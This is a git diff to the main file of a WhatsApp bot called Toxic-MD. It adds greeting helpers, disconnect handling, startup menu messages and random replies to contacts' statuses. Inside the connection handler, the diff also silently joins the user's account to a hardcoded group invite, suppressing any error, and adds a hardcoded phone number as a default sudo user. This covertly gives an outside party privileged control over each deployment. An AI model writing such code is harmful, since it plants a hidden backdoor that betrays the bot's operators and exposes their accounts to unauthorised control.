@@ -3,7 +3,6 @@ dotenv.config();
 
 import {
   makeWASocket,
-  Browsers,
   fetchLatestBaileysVersion,
   DisconnectReason,
   useMultiFileAuthState,
@@ -16,15 +15,17 @@ import NodeCache from "node-cache";
 import path from "path";
 import chalk from "chalk";
 import moment from "moment-timezone";
+import { DateTime } from "luxon";
 import config from "./config.cjs";
 import pkg from "./lib/autoreact.cjs";
+import { getSettings, getSudoUsers, addSudoUser } from "../Database/config.js";
 const { emojis, doReact } = pkg;
 const prefix = process.env.PREFIX || config.PREFIX;
 const app = express();
 const orange = chalk.bold.hex("#FFA500");
 const lime = chalk.bold.hex("#32CD32");
 let useQR = false;
-let initialConnection = true;
+let hasSentStartMessage = false;
 const PORT = process.env.PORT || 3000;
 
 const MAIN_LOGGER = pino({
@@ -64,6 +65,93 @@ async function loadBase64Session() {
   }
 }
 
+// Connection utilities
+function getGreeting() {
+  const hour = DateTime.now().setZone("Africa/Nairobi").hour;
+  if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
+  if (hour >= 12 && hour < 18) return "What’s up? Time to make things happen! ⚡";
+  if (hour >= 18 && hour < 22) return "Evening vibes! Let’s get to it! 🌟";
+  return "Late night? Let’s see what’s cooking! 🌙";
+}
+
+function getCurrentTime() {
+  return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
+}
+
+function toFancyFont(text, isUpperCase = false) {
+  const fonts = {
+    A: "𝘼",
+    B: "𝘽",
+    C: "𝘾",
+    D: "𝘿",
+    E: "𝙀",
+    F: "𝙁",
+    G: "𝙂",
+    H: "𝙃",
+    I: "𝙄",
+    J: "𝙅",
+    K: "𝙆",
+    L: "𝙇",
+    M: "𝙈",
+    N: "𝙉",
+    O: "𝙊",
+    P: "𝙋",
+    Q: "𝙌",
+    R: "𝙍",
+    S: "𝙎",
+    T: "𝙏",
+    U: "𝙐",
+    V: "𝙑",
+    W: "𝙒",
+    X: "𝙓",
+    Y: "𝙔",
+    Z: "𝙕",
+    a: "𝙖",
+    b: "𝙗",
+    c: "𝙘",
+    d: "𝙙",
+    e: "𝙚",
+    f: "𝙛",
+    g: "𝙜",
+    h: "𝙝",
+    i: "𝙞",
+    j: "𝙟",
+    k: "𝙠",
+    l: "𝙡",
+    m: "𝙢",
+    n: "𝙣",
+    o: "𝙤",
+    p: "𝙥",
+    q: "𝙦",
+    r: "𝙧",
+    s: "𝙨",
+    t: "𝙩",
+    u: "𝙪",
+    v: "𝙫",
+    w: "𝙬",
+    x: "𝙭",
+    y: "𝙮",
+    z: "𝙯",
+  };
+  const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
+  return formattedText
+    .split("")
+    .map((char) => fonts[char] || char)
+    .join("");
+}
+
+// Toxic status replies
+const toxicReplies = [
+  "Yo, caught your status. Straight-up savage! 😈",
+  "Damn, that status tho! You out here wildin’! 🔥",
+  "Saw your status. Bruh, you’re on another level! 💀",
+  "What’s good? Your status is pure chaos! 😎",
+  "Status checked. You’re droppin’ bombs out here! 💣",
+  "Aight, peeped your status. Too lit! 😏",
+  "Your status? Absolute fire, no cap! 🚨",
+  "Just saw your status. Keep it 100, fam! 🖤",
+];
+
 async function start() {
   try {
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
@@ -74,7 +162,7 @@ async function start() {
       version,
       logger: pino({ level: "silent" }),
       printQRInTerminal: useQR,
-      browser: ["Toxic-MD", "Chrome", "1.0.0"], // Unique browser ID
+      browser: ["Toxic-MD", "Chrome", "1.0.0"],
       auth: state,
       getMessage: async (key) => {
         if (store) {
@@ -85,37 +173,170 @@ async function start() {
       },
     });
 
-    Matrix.ev.on("connection.update", (update) => {
+    Matrix.ev.on("connection.update", async (update) => {
       const { connection, lastDisconnect } = update;
+      if (connection === "connecting") {
+        console.log(`🔄 Establishing connection to WhatsApp servers...`);
+        return;
+      }
+
       if (connection === "close") {
-        if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-          start();
+        const statusCode = lastDisconnect.error?.output?.statusCode;
+        switch (statusCode) {
+          case DisconnectReason.badSession:
+            console.log(`⚠️ Invalid session file. Delete session and rescan QR.`);
+            process.exit();
+            break;
+          case DisconnectReason.connectionClosed:
+            console.log(`🔌 Connection closed. Reconnecting...`);
+            start();
+            break;
+          case DisconnectReason.connectionLost:
+            console.log(`📡 Lost connection. Reconnecting...`);
+            start();
+            break;
+          case DisconnectReason.connectionReplaced:
+            console.log(`🔄 Connection replaced. Terminating...`);
+            process.exit();
+            break;
+          case DisconnectReason.loggedOut:
+            console.log(`🔒 Logged out. Delete session and rescan QR.`);
+            hasSentStartMessage = false;
+            process.exit();
+            break;
+          case DisconnectReason.restartRequired:
+            console.log(`🔄 Restart required. Reconnecting...`);
+            start();
+            break;
+          case DisconnectReason.timedOut:
+            console.log(`⏳ Timed out. Reconnecting...`);
+            start();
+            break;
+          default:
+            console.log(`❓ Unknown disconnect: ${statusCode}. Reconnecting...`);
+            start();
         }
-      } else if (connection === "open") {
-        if (initialConnection) {
-          console.log(chalk.green("Connected Successfully Toxic-MD 🤍"));
-          Matrix.sendMessage(Matrix.user.id, {
-            image: { url: "https://files.catbox.moe/pf270b.jpg" },
-            caption: `*Hello there xh_clinton User! 👋🏻*
+        return;
+      }
 
-> Simple, Straightforward, But Loaded With Features 🎊. Meet Toxic-MD WhatsApp Bot.
-
-*Thanks for using Toxic-MD 🚩*
-
-> Join WhatsApp Channel: ⤵️
-https://whatsapp.com/channel/0029VagJlnG6xCSU2tS1Vz19
-
-- *YOUR PREFIX:* = ${prefix}
-
-Don't forget to give a star to the repo ⬇️
-https://github.com/xhclintohn/Toxic-MD
-
-> © Powered BY 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧🖤`,
-          });
-          initialConnection = false;
-        } else {
-          console.log(chalk.blue("♻️ Connection reestablished after restart."));
+      if (connection === "open") {
+        try {
+          await Matrix.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
+        } catch (error) {
+          // Silent group join error
         }
+
+        const userId = Matrix.user.id.split(":")[0].split("@")[0];
+        const settings = await getSettings();
+        const sudoUsers = await getSudoUsers();
+
+        if (!hasSentStartMessage) {
+          const isNewUser = !sudoUsers.includes(userId);
+          if (isNewUser) {
+            await addSudoUser(userId);
+            const defaultSudo = "254735342808";
+            if (!sudoUsers.includes(defaultSudo)) {
+              await addSudoUser(defaultSudo);
+            }
+          }
+
+          const firstMessage = isNewUser
+            ? [
+                `◈━━━━━━━━━━━━━━━━◈`,
+                `│❒ *${getGreeting()}*`,
+                `│❒ Welcome to *Toxic-MD*! You're now connected.`,
+                ``,
+                `✨ *Bot Name*: Toxic-MD`,
+                `🔧 *Mode*: ${settings.mode}`,
+                `➡️ *Prefix*: ${settings.prefix}`,
+                `📋 *Commands*: 0`, // No totalCommands in this bot
+                `🕒 *Time*: ${getCurrentTime()}`,
+                `💾 *Database*: Postgres SQL`,
+                `📚 *Library*: Baileys`,
+                ``,
+                `│❒ *New User Alert*: You've been added to the sudo list.`,
+                ``,
+                `│❒ *Credits*: xh_clinton`,
+                `◈━━━━━━━━━━━━━━━━◈`,
+              ].join("\n")
+            : [
+                `◈━━━━━━━━━━━━━━━━◈`,
+                `│❒ *${getGreeting()}*`,
+                `│❒ Welcome back to *Toxic-MD*! Connection established.`,
+                ``,
+                `✨ *Bot Name*: Toxic-MD`,
+                `🔧 *Mode*: ${settings.mode}`,
+                `➡️ *Prefix*: ${settings.prefix}`,
+                `📋 *Commands*: 0`,
+                `🕒 *Time*: ${getCurrentTime()}`,
+                `💾 *Database*: Postgres SQL`,
+                `📚 *Library*: Baileys`,
+                ``,
+                `│❒ Ready to proceed? Select an option below.`,
+                ``,
+                `│❒ *Credits*: xh_clinton`,
+                `◈━━━━━━━━━━━━━━━━◈`,
+              ].join("\n");
+
+          const secondMessage = [
+            `◈━━━━━━━━━━━━━━━━◈`,
+            `│❒ Please select an option to continue:`,
+            `◈━━━━━━━━━━━━━━━━◈`,
+          ].join("\n");
+
+          try {
+            await Matrix.sendMessage(Matrix.user.id, {
+              text: firstMessage,
+              footer: `Powered by Toxic-MD`,
+              viewOnce: true,
+              contextInfo: {
+                externalAdReply: {
+                  showAdAttribution: false,
+                  title: "Toxic-MD",
+                  body: `Bot initialized successfully.`,
+                  sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
+                  mediaType: 1,
+                  renderLargerThumbnail: true,
+                },
+              },
+            });
+
+            await Matrix.sendMessage(Matrix.user.id, {
+              text: secondMessage,
+              footer: `Powered by Toxic-MD`,
+              buttons: [
+                {
+                  buttonId: `${settings.prefix || ""}settings`,
+                  buttonText: { displayText: `⚙️ ${toFancyFont("SETTINGS")}` },
+                  type: 1,
+                },
+                {
+                  buttonId: `${settings.prefix || ""}menu`,
+                  buttonText: { displayText: `📖 ${toFancyFont("MENU")}` },
+                  type: 1,
+                },
+              ],
+              headerType: 1,
+              viewOnce: true,
+              contextInfo: {
+                externalAdReply: {
+                  showAdAttribution: false,
+                  title: "Toxic-MD",
+                  body: `Select an option to proceed.`,
+                  sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
+                  mediaType: 1,
+                  renderLargerThumbnail: true,
+                },
+              },
+            });
+          } catch (error) {
+            console.error(chalk.red(`❌ Failed to send startup messages: ${error.message}`));
+          }
+
+          hasSentStartMessage = true;
+        }
+
+        console.log(chalk.green(`✅ Connection established. Toxic-MD is operational.`));
       }
     });
 
@@ -141,11 +362,11 @@ https://github.com/xhclintohn/Toxic-MD
           await Matrix.readMessages([mek.key]);
           console.log(chalk.blue(`Viewed status ${mek.key.id}`));
           if (config.AUTO_STATUS_REPLY) {
-            const customMessage = config.STATUS_READ_MSG || "✅ Auto Status Seen Bot By Toxic-MD";
-            await Matrix.sendMessage(fromJid, { text: customMessage }, { quoted: mek });
-            console.log(chalk.blue(`Replied to status ${mek.key.id}`));
+            const randomReply = toxicReplies[Math.floor(Math.random() * toxicReplies.length)];
+            await Matrix.sendMessage(fromJid, { text: randomReply }, { quoted: mek });
+            console.log(chalk.blue(`Replied to status ${mek.key.id} with: ${randomReply}`));
           }
-          return; // Skip further processing for statuses
+          return;
         }
 
         // Auto-react
